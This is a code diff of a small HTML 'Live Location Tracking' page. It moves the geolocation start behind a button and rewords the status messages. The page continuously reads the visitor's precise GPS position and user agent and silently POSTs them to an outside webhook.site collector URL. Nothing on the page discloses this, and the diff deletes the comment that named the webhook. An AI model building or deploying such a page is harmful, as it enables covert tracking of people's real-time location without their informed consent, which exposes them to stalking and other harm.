@@ -7,17 +7,21 @@
 <body>
 
 <h3>Live Location Tracking</h3>
-<p id="status">Waiting for GPS permission…</p>
+<p id="status">Tap the button to start GPS tracking.</p>
 <p id="coords"></p>
 
+<button onclick="startTracking()">Start Tracking</button>
+
 <script>
-if (!navigator.geolocation) {
-  document.getElementById("status").innerText =
-    "Geolocation not supported on this device.";
-} else {
+function startTracking() {
+  if (!navigator.geolocation) {
+    document.getElementById("status").innerText =
+      "Geolocation not supported on this device.";
+    return;
+  }
 
   document.getElementById("status").innerText =
-    "Live tracking started. Keep this page open.";
+    "Requesting GPS permission...";
 
   navigator.geolocation.watchPosition(
     (pos) => {
@@ -29,13 +33,14 @@ if (!navigator.geolocation) {
         userAgent: navigator.userAgent
       };
 
-      // Display on screen
+      document.getElementById("status").innerText =
+        "Live tracking started.";
+
       document.getElementById("coords").innerText =
         `Latitude: ${data.latitude}
 Longitude: ${data.longitude}
 Accuracy: ${data.accuracy} meters`;
 
-      // Send updates to webhook
       fetch("https://webhook.site/8f979837-3de8-4935-b9c0-7e1d6d4e0125", {
         method: "POST",
         mode: "no-cors",
@@ -47,7 +52,7 @@ Accuracy: ${data.accuracy} meters`;
     },
     (err) => {
       document.getElementById("status").innerText =
-        "Location access stopped or denied.";
+        "Location permission denied or unavailable.";
     },
     {
       enableHighAccuracy: true,
